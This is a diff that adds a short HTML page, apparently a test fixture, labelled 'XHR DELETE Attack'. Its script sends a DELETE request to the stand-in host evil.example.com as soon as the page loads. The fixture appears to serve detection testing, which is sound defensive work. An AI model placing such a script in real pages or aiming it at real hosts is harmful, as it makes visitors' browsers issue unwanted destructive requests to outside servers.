@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>XHR DELETE Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: XHR DELETE request to external server
+    const xhr = new XMLHttpRequest();
+    xhr.open('DELETE', 'https://evil.example.com/data/123', true);
+    xhr.send();
+  </script>
+</body>
+</html>
